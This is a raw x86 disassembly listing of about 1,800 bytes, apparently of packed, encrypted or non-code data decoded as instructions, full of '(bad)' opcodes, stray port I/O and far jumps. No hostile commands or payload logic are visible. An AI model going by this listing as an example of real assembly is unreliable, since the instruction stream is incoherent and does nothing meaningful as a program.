  4082c8:	xor    edx,DWORD PTR [eax]
  4082ca:	xor    al,0x52
  4082cc:	inc    edx
  4082cd:	retf   
  4082ce:	jmp    0x408285
  4082d0:	push   esp
  4082d1:	outs   dx,DWORD PTR ds:[esi]
  4082d2:	popf   
  4082d3:	add    eax,0x1da98c0c
  4082d8:	retf   0x49a2
  4082db:	jbe    0x4082ab
  4082dd:	sub    cl,BYTE PTR [ebx-0x4e]
  4082e0:	icebp  
  4082e1:	sahf   
  4082e2:	in     al,0xdf
  4082e4:	ins    DWORD PTR es:[edi],dx
  4082e5:	int    0x35
  4082e7:	jge    0x4082b8
  4082e9:	inc    ebp
  4082ea:	(bad)  
  4082eb:	xor    eax,0x3bce71ef
  4082f0:	cli    
  4082f1:	(bad)  
  4082f2:	lods   al,BYTE PTR ds:[esi]
  4082f3:	pop    ebx
  4082f4:	dec    esi
  4082f5:	stos   DWORD PTR es:[edi],eax
  4082f6:	xchg   esp,eax
  4082f7:	add    al,0xb4
  4082f9:	test   ch,bh
  4082fb:	cld    
  4082fc:	test   eax,0x93ded41
  408301:	cmp    DWORD PTR [esi-0x604a9053],0x60748d5d
  40830b:	and    DWORD PTR [esp+esi*2],ecx
  40830e:	in     eax,0xc7
  408310:	fs cld 
  408312:	and    bl,dh
  408314:	adc    dl,dl
  408316:	jne    0x408350
  408318:	inc    ebp
  408319:	pop    esi
  40831a:	stos   DWORD PTR es:[edi],eax
  40831b:	add    al,0xd
  40831d:	mov    edx,0xd57bdc2f
  408322:	(bad)  
  408323:	mov    al,0xe8
  408325:	ret    
  408326:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408327:	in     eax,dx
  408328:	sbb    bl,BYTE PTR [ebx+0x19246ed8]
  40832e:	fmul   QWORD PTR [edx+0x59]
  408331:	lods   al,BYTE PTR ds:[esi]
  408332:	mov    BYTE PTR [eax],al
  408334:	dec    esi
  408335:	mov    al,ds:0x764a6eea
  40833a:	fcomp  st(4)
  40833c:	xor    BYTE PTR [ecx+0x3b],0xcb
  408340:	(bad)  
  408342:	imul   eax,DWORD PTR [ebx+0x39],0x5d59443d
  408349:	or     eax,0x58e365d4
  40834e:	add    DWORD PTR [ebp-0x30d210fe],ebp
  408354:	mov    ebp,DWORD PTR [edx+0x78]
  408357:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408358:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408359:	sbb    al,0x8a
  40835b:	xor    BYTE PTR [ebx+0x52],0xd6
  40835f:	fisttp WORD PTR [ebx]
  408361:	test   al,0xda
  408363:	adc    DWORD PTR [ebp+ecx*8-0x740f30e5],esi
  40836a:	add    DWORD PTR [ecx-0x11],eax
  40836d:	out    dx,al
  40836e:	sahf   
  40836f:	push   esi
  408370:	inc    eax
  408371:	ss out 0x8,al
  408374:	or     BYTE PTR [ebp+0x52],ah
  408377:	and    al,0x41
  408379:	lds    edi,FWORD PTR [edx+edx*4+0x50fb57a4]
  408380:	rcr    DWORD PTR [eax-0x4455327e],cl
  408386:	or     BYTE PTR [ebx+0x19d3bdba],cl
  40838c:	xor    DWORD PTR [edi-0x62266169],edx
  408392:	cmp    ebx,DWORD PTR [ebx-0xd]
  408395:	fldcw  WORD PTR [eax+0x31]
  408398:	dec    ebx
  408399:	ss mov cl,0xac
  40839c:	(bad)  
  40839e:	mov    esp,cs
  4083a0:	call   0x690e:0xb06a79d0
  4083a7:	adc    eax,0x128dbac7
  4083ac:	test   eax,0xd940b7f4
  4083b1:	sbb    DWORD PTR [edx+0x0],esp
  4083b4:	or     BYTE PTR [ecx-0xf],0xd7
  4083b8:	loop   0x408378
  4083ba:	rol    DWORD PTR [ebx-0x4627100],0x60
  4083c1:	(bad)  
  4083c2:	mov    ch,0xf0
  4083c4:	out    0x5b,eax
  4083c6:	popf   
  4083c7:	aad    0xd2
  4083c9:	ret    
  4083ca:	sar    dh,1
  4083cc:	cmp    eax,0x609964a1
  4083d1:	jae    0x4083a4
  4083d3:	test   eax,0xece74012
  4083d8:	add    bh,bl
  4083da:	inc    edi
  4083db:	and    al,0xb4
  4083dd:	ja     0x408418
  4083df:	(bad)  
  4083e0:	mov    bh,0xb4
  4083e2:	pop    edx
  4083e3:	mov    dl,BYTE PTR [ecx+0x7b28fd72]
  4083e9:	cmp    BYTE PTR [edx],bh
  4083eb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4083ec:	sbb    eax,esi
  4083ee:	inc    ebp
  4083ef:	lea    eax,[edx]
  4083f1:	repnz test eax,0x23ec48b1
  4083f7:	mov    edi,0x1cac0a5d
  4083fc:	jnp    0x4083b5
  4083fe:	adc    ch,BYTE PTR [ebp+0x657e5f14]
  408404:	test   BYTE PTR ds:0x498f1397,bh
  40840a:	lock mov ebx,0xca139f40
  408410:	les    ebp,FWORD PTR [eax-0x6c]
  408413:	jae    0x4083fe
  408415:	adc    eax,0x52b72a7b
  40841a:	xchg   bh,ch
  40841c:	fwait
  40841d:	pop    edi
  40841e:	scas   al,BYTE PTR es:[edi]
  40841f:	cmp    al,al
  408421:	aas    
  408422:	cli    
  408423:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408424:	gs push esp
  408426:	adc    dh,BYTE PTR ds:0x9bbf4903
  40842c:	sti    
  40842d:	(bad)  
  40842e:	addr16 push eax
  408430:	sub    eax,0x2be31234
  408435:	fadd   st(4),st
  408437:	sub    dl,BYTE PTR ds:0x9c9e0289
  40843d:	ficom  DWORD PTR [esi-0x17153e8c]
  408443:	pop    edi
  408444:	scas   eax,DWORD PTR es:[edi]
  408445:	mov    fs,WORD PTR [edi+0x58]
  408448:	inc    ebx
  408449:	loop   0x408473
  40844b:	(bad)  
  40844c:	mov    cl,0xfb
  40844e:	dec    ebp
  40844f:	sar    ch,cl
  408451:	dec    ecx
  408452:	outs   dx,BYTE PTR ds:[esi]
  408453:	in     al,0xa4
  408455:	and    BYTE PTR [eax+0x5a561ce3],bh
  40845b:	push   ds
  40845c:	sar    eax,cl
  40845e:	mov    ah,0xad
  408460:	jmp    DWORD PTR ds:0xa3e5db1f
  408466:	test   BYTE PTR [esi+edx*8],dl
  408469:	cs aam 0xea
  40846c:	cmp    eax,0xdcbc5a15
  408471:	jmp    0x4084a0
  408473:	xor    DWORD PTR [eax+0x37],ecx
  408476:	rcr    DWORD PTR [ecx-0x6512578a],0xea
  40847d:	out    dx,al
  40847e:	push   eax
  40847f:	xchg   esi,eax
  408480:	call   0xd827:0x1633e255
  408487:	sub    eax,0xcedd6fa1
  40848c:	test   al,0x3d
  40848e:	js     0x408436
  408490:	arpl   WORD PTR [esi-0x32],cx
  408493:	mov    esi,0x2c39f35e
  408498:	adc    ch,BYTE PTR ds:0x72a994ae
  40849e:	add    al,0x3c
  4084a0:	outs   dx,BYTE PTR ds:[esi]
  4084a1:	fistp  WORD PTR ds:0xc23f07b7
  4084a7:	mov    ch,0xd4
  4084a9:	(bad)  
  4084ab:	dec    edi
  4084ac:	push   edx
  4084ad:	mov    ds:0x74f030e4,eax
  4084b2:	and    dh,cl
  4084b4:	mov    ebp,DWORD PTR [ecx]
  4084b6:	div    DWORD PTR [esi]
  4084b8:	xchg   ebp,eax
  4084b9:	jmp    0x7986d0ca
  4084be:	jns    0x4084cb
  4084c0:	jno    0x408535
  4084c2:	and    al,0x6d
  4084c4:	xlat   BYTE PTR ds:[ebx]
  4084c5:	(bad)  
  4084c6:	push   ebx
  4084c7:	and    BYTE PTR [esi-0x35c73b3c],bh
  4084cd:	das    
  4084ce:	fwait
  4084cf:	rol    DWORD PTR [edi],cl
  4084d1:	cmp    ebp,DWORD PTR [edx-0x21]
  4084d4:	xchg   ecx,eax
  4084d5:	mov    ecx,0xf1f3d0c8
  4084da:	sbb    BYTE PTR [eax],ah
  4084dc:	sar    BYTE PTR [ebx],1
  4084de:	jnp    0x408480
  4084e0:	out    0x70,eax
  4084e2:	pop    eax
  4084e3:	push   cs
  4084e4:	push   cs
  4084e5:	fimul  DWORD PTR [edi+0x47]
  4084e8:	mov    edx,0x3da72c91
  4084ed:	inc    esp
  4084ee:	daa    
  4084ef:	imul   edi,DWORD PTR [esi],0x6a
  4084f2:	scas   al,BYTE PTR es:[edi]
  4084f3:	push   es
  4084f4:	or     eax,DWORD PTR [eax]
  4084f6:	mov    ecx,0xa6cdbf5b
  4084fb:	sar    DWORD PTR [esi+0x7a],1
  4084fe:	push   esp
  4084ff:	add    DWORD PTR [ecx],eax
  408501:	ins    BYTE PTR es:[edi],dx
  408502:	mov    ebp,0xeca0c7d3
  408507:	jmp    0x21db1c9c
  40850c:	mov    ebp,0x9e4574f4
  408511:	inc    esi
  408512:	sub    BYTE PTR [eax+0x250c3e36],0x1f
  408519:	dec    esp
  40851a:	popa   
  40851b:	bound  edi,QWORD PTR [ebp-0x485707c5]
  408521:	iret   
  408522:	hlt    
  408523:	push   ebx
  408524:	dec    ebx
  408525:	popa   
  408526:	int3   
  408527:	jne    0x4084ef
  408529:	cmp    DWORD PTR [eax+0x324070a7],eax
  40852f:	(bad)  
  408530:	cmp    DWORD PTR [edi+0x57],edi
  408533:	sub    eax,0xcea8ca58
  408538:	sub    BYTE PTR [eax+0x762e1027],0x18
  40853f:	push   0x4f1c0184
  408544:	inc    ebp
  408545:	(bad)  
  408546:	sub    al,0x80
  408548:	inc    eax
  408549:	and    al,0x45
  40854b:	in     al,dx
  40854c:	mov    cl,0xf5
  40854f:	jl     0x408554
  408551:	mov    eax,ds:0x2045fac2
  408556:	pop    edx
  408557:	jne    0x40857d
  408559:	push   ds
  40855a:	push   0x6c4eabf1
  40855f:	mov    DWORD PTR [eax-0x3eeb05c9],0x7b0636ca
  408569:	call   0x60bb:0x7443445a
  408570:	and    DWORD PTR [edi+0x51],ebx
  408573:	loop   0x408593
  408575:	rcr    DWORD PTR [ebx+0x7b91d1b8],1
  40857b:	xchg   DWORD PTR [esi],edi
  40857d:	push   edi
  40857e:	inc    ebx
  40857f:	sub    eax,0x759b061f
  408584:	mov    al,0x90
  408586:	test   BYTE PTR [edi],dl
  408588:	hlt    
  408589:	sub    DWORD PTR [ecx-0x2b164f85],0x50
  408590:	test   esp,ebp
  408592:	xlat   BYTE PTR ds:[ebx]
  408593:	fmul   QWORD PTR [edx+ecx*4]
  408596:	test   DWORD PTR [eax],eax
  408598:	jb     0x4085ee
  40859a:	jb     0x408604
  40859c:	push   0x6
  40859e:	sbb    eax,esi
  4085a0:	sub    esp,esi
  4085a2:	ins    DWORD PTR es:[edi],dx
  4085a3:	adc    eax,0x7a5c763f
  4085a8:	int3   
  4085a9:	add    ebp,DWORD PTR [ecx+ebx*4-0x36b5c98e]
  4085b0:	(bad)
  4085b3:	mov    al,ds:0x53ff95a0
  4085b8:	push   esi
  4085b9:	pop    ss
  4085ba:	adc    dl,BYTE PTR [edi+0x14]
  4085bd:	sub    al,0xd0
  4085bf:	mov    dh,0xcf
  4085c1:	sbb    ecx,DWORD PTR [edi+0x49]
  4085c4:	cmp    al,0x97
  4085c6:	sbb    ah,bh
  4085c8:	(bad)  
  4085c9:	mul    BYTE PTR [ebx+0x1a]
  4085cc:	sub    edx,esp
  4085ce:	push   ss
  4085cf:	ds mov dh,0xa5
  4085d2:	(bad)  
  4085d3:	in     al,0xfc
  4085d5:	js     0x4085d5
  4085d7:	xchg   esp,eax
  4085d8:	(bad)  
  4085d9:	pop    esp
  4085da:	pushf  
  4085db:	cmp    cl,ah
  4085dd:	push   esi
  4085de:	adc    bl,BYTE PTR [esi+0xcd6f01c]
  4085e4:	shl    edi,0x9f
  4085e7:	ficomp DWORD PTR [edi+0x2856de6]
  4085ed:	hlt    
  4085ee:	sbb    DWORD PTR [ebx+0x66],ebx
  4085f1:	push   ebp
  4085f2:	pop    ecx
  4085f3:	xchg   BYTE PTR [ebp-0x2d8803ee],ah
  4085f9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4085fa:	lods   al,BYTE PTR ds:[esi]
  4085fb:	jo     0x408643
  4085fd:	out    0xf2,eax
  4085ff:	xor    BYTE PTR [edx-0x69],0x58
  408603:	inc    ecx
  408604:	ret    
  408605:	test   BYTE PTR [esi-0x4cb50f33],dl
  40860b:	pop    edi
  40860c:	jns    0x40862b
  40860e:	or     eax,esi
  408610:	pop    ss
  408611:	jno    0x408691
  408613:	retf   0xc81c
  408616:	sub    ecx,DWORD PTR [edi]
  408618:	(bad)  
  408619:	cmp    DWORD PTR [ecx+0x609a8826],eax
  40861f:	dec    esi
  408620:	test   eax,0x402989b1
  408625:	mov    esi,0xb70e380a
  40862a:	in     eax,0x32
  40862c:	xlat   BYTE PTR ds:[ebx]
  40862d:	nop
  40862e:	and    al,0x44
  408630:	and    bl,BYTE PTR [edi-0x526a29dc]
  408636:	pop    es
  408637:	fs xchg esp,eax
  408639:	fmul   DWORD PTR [ecx-0x3b]
  40863c:	jbe    0x4086ae
  40863e:	xor    edx,DWORD PTR [ebx+ebp*8-0x11a17352]
  408645:	int3   
  408646:	push   ds
  408647:	xor    DWORD PTR [edi-0x1],0x65
  40864b:	hlt    
  40864c:	dec    ebp
  40864d:	push   edi
  40864e:	adc    BYTE PTR [bp+si],dh
  408651:	mov    bh,0xe5
  408653:	mov    bl,0x8b
  408655:	aad    0xd2
  408657:	xor    bh,0x90
  40865a:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40865c:	mov    WORD PTR [ecx+0x16efc275],?
  408662:	cmp    eax,0xaf41144a
  408667:	mov    eax,0xf844b56e
  40866c:	pop    esi
  40866d:	jp     0x4086df
  40866f:	cmp    BYTE PTR [esi+0x6affa7c7],ch
  408675:	outs   dx,BYTE PTR ds:[esi]
  408676:	into   
  408677:	cdq    
  408678:	in     al,dx
  408679:	in     eax,0x35
  40867b:	mov    ecx,0x9da096a7
  408680:	jb     0x408614
  408682:	out    0xda,eax
  408684:	(bad)  
  408685:	repnz sub eax,0xdcf8c667
  40868b:	sbb    eax,0xffffff8a
  40868e:	mov    ah,bl
  408690:	je     0x40863d
  408692:	out    0xb1,al
  408694:	pop    ss
  408695:	imul   edx,DWORD PTR [ebx-0x49],0xffffffcd
  408699:	popa   
  40869a:	sbb    ebp,DWORD PTR [ecx+0x66a428ff]
  4086a0:	dec    ebp
  4086a1:	jb     0x40867d
  4086a3:	xor    bh,ah
  4086a5:	or     BYTE PTR [eax+ebp*4+0x38],bl
  4086a9:	push   ecx
  4086aa:	sub    esp,eax
  4086ac:	mov    ah,0x90
  4086ae:	or     edx,DWORD PTR ds:0x62542038
  4086b4:	mov    al,ds:0x996ee7be
  4086b9:	sbb    DWORD PTR [edi],edx
  4086bb:	or     al,0x33
  4086bd:	sbb    eax,0x8629b678
  4086c2:	sub    BYTE PTR [esi],0x45
  4086c5:	push   ecx
  4086c6:	adc    eax,0x854ac930
  4086cb:	pop    eax
  4086cc:	mov    ds:0xd581a88a,al
  4086d1:	mov    bl,0x6d
  4086d3:	test   eax,0x5e2693e8
  4086d8:	outs   dx,BYTE PTR ds:[esi]
  4086d9:	dec    ebp
  4086da:	out    0x57,eax
  4086dc:	cld    
  4086dd:	jmp    0x3527:0xf8f287d7
  4086e4:	fld    QWORD PTR [ebx-0x19]
  4086e7:	fstp   DWORD PTR [eax-0x65b06e4b]
  4086ed:	ret    0xd060
  4086f0:	adc    dh,ch
  4086f2:	imul   esi,DWORD PTR [edx+0x70396550],0xffffff9c
  4086f9:	jge    0x40868e
  4086fb:	rol    eax,cl
  4086fd:	ror    DWORD PTR [esi+edx*2],0xaf
  408701:	jmp    0x7c50:0x4f6f080e
  408708:	adc    eax,0x4f1fcbda
  40870d:	out    dx,al
  40870e:	cs stos DWORD PTR es:[edi],eax
  408710:	lods   al,BYTE PTR gs:[esi]
  408712:	dec    esp
  408713:	int3   
  408714:	inc    ecx
  408715:	inc    esp
  408717:	sub    BYTE PTR [esi],0x58
  40871a:	mov    WORD PTR [edi-0x2cbfe955],ds
  408720:	or     eax,0x50f50a41
  408725:	push   0x28
  408727:	mov    ds:0xeb5c104f,eax
  40872c:	or     al,0x6a
  40872e:	lods   al,BYTE PTR ds:[esi]
  40872f:	xchg   ebp,eax
  408730:	rcr    DWORD PTR [edi+0x33a8b6e8],cl
  408736:	ins    BYTE PTR es:[edi],dx
  408737:	adc    cl,BYTE PTR [edx+0x26]
  40873a:	test   eax,0x9ab82263
  40873f:	or     BYTE PTR [ecx+0x6a],dh
  408742:	sar    ebp,cl
  408744:	daa    
  408745:	cmp    DWORD PTR [esi-0x59b97a5],esp
  40874b:	fadd   DWORD PTR [edx-0x2d]
  40874e:	pop    esi
  40874f:	sbb    DWORD PTR [ebx+0x34b445f7],esi
  408755:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408756:	xchg   ebp,eax
  408757:	sub    ebp,DWORD PTR [esi+0x533b905c]
  40875d:	xor    BYTE PTR [edi-0xd],dh
  408760:	sub    al,0xf7
  408762:	das    
  408763:	rcl    BYTE PTR ds:0xe575581a,1
  408769:	xlat   BYTE PTR ds:[ebx]
  40876a:	pop    ebp
  40876b:	push   ds
  40876c:	inc    ebx
  40876d:	repnz dec edx
  40876f:	aam    0x2c
  408771:	mov    dh,0x99
  408773:	popa   
  408774:	sar    DWORD PTR [ebp-0x49],1
  408777:	adc    eax,0x5a111ca
  40877c:	adc    BYTE PTR [edi+0x127643f7],ch
  408782:	fcomp  DWORD PTR [ebx-0x3280af4d]
  408788:	test   al,0x3b
  40878a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40878b:	add    BYTE PTR [ebx+0x5a478864],0x18
  408792:	fnop   
  408794:	inc    ebx
  408795:	int    0xc2
  408797:	scas   al,BYTE PTR es:[edi]
  408798:	test   al,0x5b
  40879a:	or     al,0xa6
  40879c:	das    
  40879d:	cld    
  40879e:	and    DWORD PTR ds:0x708e49,edx
  4087a4:	loope  0x4087fa
  4087a6:	pop    ebp
  4087a7:	fwait
  4087a8:	call   0x97138f1b
  4087ad:	rcl    cl,cl
  4087af:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4087b0:	jecxz  0x40875c
  4087b2:	push   ebp
  4087b3:	jp     0x4087d8
  4087b5:	mov    dl,0x9f
  4087b7:	cs dec edx
  4087b9:	rol    DWORD PTR [esi],cl
  4087bb:	rcr    DWORD PTR [edx-0x34],1
  4087be:	stos   BYTE PTR es:[edi],al
  4087bf:	jbe    0x4087b4
  4087c1:	rcr    BYTE PTR [eax-0x4ae7d30c],1
  4087c7:	push   0x760b3702
  4087cc:	fimul  WORD PTR [eax-0x4d1119c8]
  4087d2:	in     al,dx
  4087d3:	jmp    0x67d3:0x626ffffe
  4087da:	cs xchg edi,eax
  4087dc:	into   
  4087dd:	mov    al,ds:0xe9c9594e
  4087e2:	jno    0x40878f
  4087e4:	push   ds
  4087e5:	inc    ebp
  4087e6:	adc    BYTE PTR [ecx-0x51],cl
  4087e9:	mov    ebx,0x2dfd354
  4087ee:	jl     0x408818
  4087f0:	xlat   BYTE PTR ds:[ebx]
  4087f1:	inc    edi
  4087f2:	push   ebx
  4087f3:	sbb    BYTE PTR [eax-0x787bd7e],0x1f
  4087fa:	fs in  eax,dx
  4087fc:	cmp    eax,0x549a6d63
  408801:	add    DWORD PTR [edi+ebp*2+0x7c],edx
  408805:	mov    al,BYTE PTR [ebp-0xf]
  408808:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408809:	out    dx,eax
  40880a:	(bad)  
  40880b:	repz jl 0x4087f3
  40880e:	jmp    0x40885c
  408810:	xor    ah,BYTE PTR [eax-0x76da6073]
  408816:	xchg   BYTE PTR [edi+0x547d0e75],bh
  40881c:	xor    ch,dl
  40881e:	cmp    al,0xd8
  408820:	ds pop eax
  408822:	xchg   DWORD PTR [ebp-0x66f9383b],esp
  408828:	cdq    
  408829:	loop   0x4087b2
  40882b:	xor    ebx,edi
  40882d:	fidiv  DWORD PTR [esp+ebp*1]
  408830:	fs jmp 0x4984b186
  408836:	or     al,0xed
  408838:	pop    eax
  408839:	fstp   st(2)
  40883b:	mov    ds:0xf52ab2bb,al
  408840:	gs inc esi
  408842:	enter  0xa048,0x84
  408846:	xchg   edx,eax
  408847:	push   0x152cdfea
  40884c:	out    dx,eax
  40884d:	pop    esi
  40884e:	mov    esp,esp
  408850:	imul   ebx,DWORD PTR [edx-0x7b],0xbaa0586a
  408857:	ficomp WORD PTR [ecx-0x16d99674]
  40885d:	aam    0x4f
  40885f:	jl     0x4088a4
  408861:	mov    cl,0x25
  408863:	rol    esp,1
  408865:	push   edx
  408866:	cdq    
  408867:	sbb    eax,0x8135fbca
  40886c:	mov    ch,bh
  40886e:	push   ebx
  40886f:	in     al,0x4
  408871:	add    DWORD PTR [eax],esi
  408873:	pop    es
  408874:	mov    eax,ds:0x7a6f1dd3
  408879:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40887a:	add    eax,DWORD PTR [eax+0x33c72790]
  408880:	ror    DWORD PTR [esi+eiz*1],1
  408883:	mov    ds:0x6179feb4,al
  408888:	fstp   QWORD PTR [ebp+0x74]
  40888b:	mov    esp,0x7f5e57ae
  408890:	call   0xf08d:0xb6d2b337
  408897:	aaa    
  408898:	loope  0x4088f4
  40889a:	sub    al,0x39
  40889c:	adc    esi,DWORD PTR [ecx]
  40889e:	pop    ebp
  40889f:	shl    ecx,1
  4088a1:	add    BYTE PTR [eax+0x2c],dl
  4088a4:	jmp    0x40885b
  4088a6:	pop    ds
  4088a7:	xchg   esi,eax
  4088a8:	pop    es
  4088a9:	add    BYTE PTR [ebp+0x38],cl
  4088ac:	addr16 jb 0x4088fb
  4088af:	jle    0x408926
  4088b1:	(bad)  
  4088b2:	(bad)  
  4088b3:	sub    al,dl
  4088b5:	sahf   
  4088b6:	mov    DWORD PTR [edi-0x19],0x5dbc54be
  4088bd:	add    edi,DWORD PTR [eax]
  4088bf:	push   ebx
  4088c0:	cmc    
  4088c1:	xor    ebx,esi
  4088c3:	and    DWORD PTR [esp+edi*2+0x4c83f502],ebx
  4088ca:	sahf   
  4088cb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4088cc:	fwait
  4088cd:	(bad)
  4088d0:	add    BYTE PTR [ecx-0x3f089327],bh
  4088d6:	xchg   DWORD PTR [eax+0x1],esi
  4088d9:	shl    BYTE PTR [ebp-0x12],0xc8
  4088dd:	test   DWORD PTR [edi-0x66150ae7],edi
  4088e3:	inc    esi
  4088e4:	dec    eax
  4088e5:	fstp   QWORD PTR [eax+0x254a9352]
  4088eb:	jmp    0xbfbf:0xc09523e0
  4088f2:	pop    ss
  4088f3:	cmp    al,0x4e
  4088f5:	outs   dx,BYTE PTR ds:[esi]
  4088f6:	gs ret 
  4088f8:	mov    al,0x16
  4088fa:	bound  esi,QWORD PTR [ecx]
  4088fc:	enter  0xf4a4,0xd6
  408900:	add    BYTE PTR [ebp-0x80],ch
  408903:	lods   al,BYTE PTR ds:[esi]
  408904:	out    dx,al
  408905:	stos   BYTE PTR es:[edi],al
  408906:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408907:	ror    dh,0x1c
  40890a:	pop    esp
  40890b:	bound  ebp,QWORD PTR [ecx+ecx*2-0xe5a74bc]
  408912:	nop
  408913:	in     al,dx
  408914:	call   0x93e02dfd
  408919:	rcr    ch,0x3c
  40891c:	(bad)  
  40891d:	jg     0x40898f
  40891f:	(bad)  
  408920:	(bad)  
  408921:	std    
  408922:	push   esp
  408923:	mov    eax,DWORD PTR [ebp+0x26]
  408926:	in     eax,dx
  408927:	adc    ecx,DWORD PTR [ebx-0x2c6625e3]
  40892d:	(bad)  
  40892e:	dec    edx
  40892f:	sub    ebp,DWORD PTR [edx+0x11]
  408932:	push   0x4
  408934:	adc    DWORD PTR [ebx+ebp*2],0xdfd95954
  40893b:	cmp    ah,BYTE PTR [edi-0x2c]
  40893e:	mov    ebp,cs
  408940:	jb     0x4088d8
  408942:	add    al,0xe0
  408944:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408945:	out    dx,eax
  408946:	int3   
  408947:	enter  0x42ed,0x70
  40894b:	mov    eax,ds:0x10b9c90e
  408950:	aas    
  408951:	fisub  DWORD PTR [ecx+edi*8-0x79]
  408955:	push   ss
  408956:	mov    edi,0xb9e01cca
  40895b:	in     al,0x98
  40895d:	leave  
  40895e:	and    bh,0xb4
  408961:	js     0x40895a
  408963:	ds dec ebx
  408965:	sbb    al,BYTE PTR [eax+0x7d7bada5]
  40896b:	jecxz  0x408903
  40896d:	sub    eax,DWORD PTR [esi]
  40896f:	or     BYTE PTR [ebx+0x17],bl
  408972:	es sub ch,cl
  408975:	into   
  408976:	fs pop ss
  408978:	sub    al,0x12
  40897a:	sar    dl,0x2f
  40897d:	xchg   ebx,eax
  40897e:	js     0x4089b2
  408980:	loopne 0x40896e
  408982:	sub    BYTE PTR [esi-0x2449dd6b],dh
  408988:	ror    BYTE PTR [ebx+0x7a],1
  40898b:	push   ebp
  40898c:	call   DWORD PTR [edi]
  40898e:	xor    DWORD PTR [ecx],0x37101723
  408994:	mov    edx,0xda0fced
  408999:	call   0x59aa:0xeee1363f
  4089a0:	rcr    DWORD PTR [edi],0x3b
  4089a3:	popa   
  4089a4:	sub    al,0x1e
  4089a6:	adc    al,BYTE PTR ds:0xf34683fb
  4089ac:	out    0xb1,al
  4089ae:	xor    bh,BYTE PTR [ebx]
  4089b0:	lods   al,BYTE PTR ds:[esi]
  4089b1:	xchg   ebx,eax
  4089b2:	mul    BYTE PTR [ebx+0x19]
  4089b5:	push   edi
  4089b6:	xchg   DWORD PTR [edx],esp
  4089b8:	dec    ebp
  4089b9:	sub    al,0x6b
  4089bb:	scas   eax,DWORD PTR es:[edi]
  4089bc:	push   esp
  4089bd:	cmp    dh,BYTE PTR [edi]
  4089bf:	retf   0x37a5
  4089c2:	je     0x40898e
  4089c4:	lds    ebp,FWORD PTR [ebp+0x39460cd4]
  4089ca:	(bad)  
  4089cb:	xchg   edi,eax
  4089cc:	inc    edx
  4089cd:	inc    eax
  4089ce:	mov    dx,0x9db0
  4089d2:	xor    edi,DWORD PTR [edi-0x35ff9761]
  4089d8:	xchg   edi,eax
  4089d9:	loop   0x408a57
  4089db:	push   ecx
  4089dc:	pop    ebx
  4089dd:	into   
  4089de:	push   0xffffffc3
  4089e0:	xchg   edi,eax
  4089e1:	push   ebp
  4089e2:	test   DWORD PTR [edi],edi
  4089e4:	push   edi
  4089e5:	sbb    BYTE PTR [edx+0x64],0x79
  4089e9:	pop    esi
  4089ea:	ins    DWORD PTR es:[edi],dx
  4089eb:	lock fs cmp al,0x4c
  4089ef:	das    
  4089f0:	out    0x54,eax
  4089f2:	inc    ebp
  4089f3:	add    eax,0x86b2dd5a
  4089f8:	cwde   
  4089f9:	push   0x103bb0ed
  4089fe:	sar    BYTE PTR [ebp-0x17],cl
  408a01:	loopne 0x408a4c
  408a03:	sti    
  408a04:	not    al
  408a06:	in     al,dx
  408a07:	push   0xed847b5a
  408a0c:	fcom   DWORD PTR [ebx+0x30]
  408a0f:	dec    edx
  408a10:	pop    edx
  408a11:	jbe    0x408a27
  408a13:	dec    esi
  408a14:	and    DWORD PTR [ecx-0x329129ab],edx
  408a1a:	outs   dx,DWORD PTR ds:[esi]
  408a1b:	sbb    al,0x8f
  408a1d:	loop   0x408a25
  408a1f:	push   es
  408a20:	lods   eax,DWORD PTR ds:[esi]
  408a21:	cwde   
  408a22:	and    DWORD PTR [ebp-0x30c03226],0x58
  408a29:	inc    edi
  408a2a:	inc    ebp
  408a2b:	jno    0x4089cf
  408a2d:	jbe    0x408a67
  408a2f:	in     eax,dx
  408a30:	into   
  408a31:	mov    cs,WORD PTR [edi-0x6b]
  408a34:	xchg   esp,eax
  408a35:	hlt    
  408a36:	jmp    0x199e31ab
  408a3b:	pop    edi
  408a3c:	sbb    ebx,0xcb6c0ad2
  408a42:	out    0x4c,al
  408a44:	jmp    0x67d6800
  408a49:	xchg   BYTE PTR [ebp+0x3b],dl
  408a4c:	adc    eax,0x172836b8
  408a51:	adc    edi,DWORD PTR [ebp+0x3e90ab4f]
  408a57:	(bad)  
  408a58:	loop   0x408a82
  408a5a:	mov    dl,0x86
  408a5c:	jnp    0x408a9c
  408a5e:	int    0xfd
  408a60:	xchg   edi,eax
  408a61:	das    
  408a62:	inc    esp
  408a63:	or     al,0x2a
  408a65:	push   es
  408a66:	sbb    eax,ecx
  408a68:	lods   eax,DWORD PTR ds:[esi]
  408a69:	push   es
  408a6a:	jne    0x408a02
  408a6c:	dec    ecx
  408a6d:	jo     0x408a23
  408a6f:	mov    cl,0xb6
  408a71:	xor    BYTE PTR [edx+0x37],0xc6
  408a75:	jmp    0x408a60
  408a77:	popf   
  408a78:	fs das 
  408a7a:	push   ds
  408a7b:	daa    
  408a7c:	call   0x7bc8:0x37286120
  408a83:	jp     0x408a2c
  408a85:	sub    bh,BYTE PTR [edi+ecx*1-0x1a]
  408a89:	dec    esp
  408a8a:	xlat   BYTE PTR ds:[ebx]
  408a8b:	cmp    DWORD PTR [ecx-0x28117e27],edx
  408a91:	in     eax,dx
  408a92:	cdq    
  408a93:	(bad)  
  408a94:	in     eax,dx
  408a95:	xchg   DWORD PTR [edi-0xe],esp
  408a98:	cmc    
  408a99:	jecxz  0x408a92
  408a9b:	not    dh
  408a9d:	fwait
  408a9e:	call   0x191b:0xade0d637
  408aa5:	loope  0x408b11
  408aa7:	or     dh,BYTE PTR [edx-0x62eac243]
  408aad:	sub    ah,BYTE PTR [edx+0x2]
  408ab0:	or     esi,edi
  408ab2:	jp     0x408a41
  408ab4:	mov    edi,0x75f765b6
  408ab9:	pop    es
  408aba:	out    0x99,al
